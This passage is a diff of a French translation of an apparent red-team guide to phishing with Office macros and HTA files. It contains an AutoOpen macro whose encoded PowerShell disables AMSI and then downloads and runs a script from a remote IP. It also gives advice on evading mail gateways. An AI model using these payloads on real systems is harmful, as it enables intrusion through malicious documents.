@@ -16,25 +16,25 @@ assoc | findstr /i "word excel powerp"
 ```
 Fichiers DOCX faisant référence à un modèle distant (Fichier – Options – Compléments – Gérer : Modèles – Aller) qui inclut des macros peuvent également “exécuter” des macros.
 
-### Chargement d'image externe
+### Chargement d'Image Externe
 
 Allez à : _Insérer --> Éléments rapides --> Champ_\
-_**Catégories** : Liens et références, **Noms de champ** : includePicture, et **Nom de fichier ou URL** :_ http://\<ip>/whatever
+_**Catégories** : Liens et Références, **Noms de champ** : includePicture, et **Nom de fichier ou URL** :_ http://\<ip>/whatever
 
 ![](<../../images/image (155).png>)
 
-### Backdoor de macros
+### Backdoor de Macros
 
 Il est possible d'utiliser des macros pour exécuter du code arbitraire à partir du document.
 
-#### Fonctions d'autoload
+#### Fonctions d'Autoload
 
 Plus elles sont courantes, plus il est probable que l'AV les détecte.
 
 - AutoOpen()
 - Document_Open()
 
-#### Exemples de code de macros
+#### Exemples de Code de Macros
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -71,7 +71,7 @@ Allez dans **Fichier > Informations > Inspecter le document > Inspecter le docum
 #### Extension de document
 
 Une fois terminé, sélectionnez le menu déroulant **Enregistrer sous le type**, changez le format de **`.docx`** à **Word 97-2003 `.doc`**.\
-Faites cela parce que vous **ne pouvez pas enregistrer de macros dans un `.docx`** et qu'il y a une **stigmatisation** **autour** de l'extension **`.docm`** activée par macro (par exemple, l'icône miniature a un énorme `!` et certains passerelles web/email les bloquent entièrement). Par conséquent, cette **ancienne extension `.doc` est le meilleur compromis**.
+Faites cela parce que vous **ne pouvez pas enregistrer de macros dans un `.docx`** et qu'il y a une **stigmatisation** **autour** de l'extension de fichier activée par macro **`.docm`** (par exemple, l'icône miniature a un énorme `!` et certains passerelles web/email les bloquent entièrement). Par conséquent, cette **ancienne extension `.doc` est le meilleur compromis**.
 
 #### Générateurs de macros malveillantes
 
@@ -83,7 +83,7 @@ Faites cela parce que vous **ne pouvez pas enregistrer de macros dans un `.docx`
 
 Un HTA est un programme Windows qui **combine HTML et langages de script (comme VBScript et JScript)**. Il génère l'interface utilisateur et s'exécute en tant qu'application "entièrement fiable", sans les contraintes du modèle de sécurité d'un navigateur.
 
-Un HTA est exécuté à l'aide de **`mshta.exe`**, qui est généralement **installé** avec **Internet Explorer**, rendant **`mshta` dépendant d'IE**. Donc, s'il a été désinstallé, les HTA ne pourront pas s'exécuter.
+Un HTA est exécuté en utilisant **`mshta.exe`**, qui est généralement **installé** avec **Internet Explorer**, rendant **`mshta` dépendant d'IE**. Donc, s'il a été désinstallé, les HTA ne pourront pas s'exécuter.
 ```html
 <--! Basic HTA Execution -->
 <html>
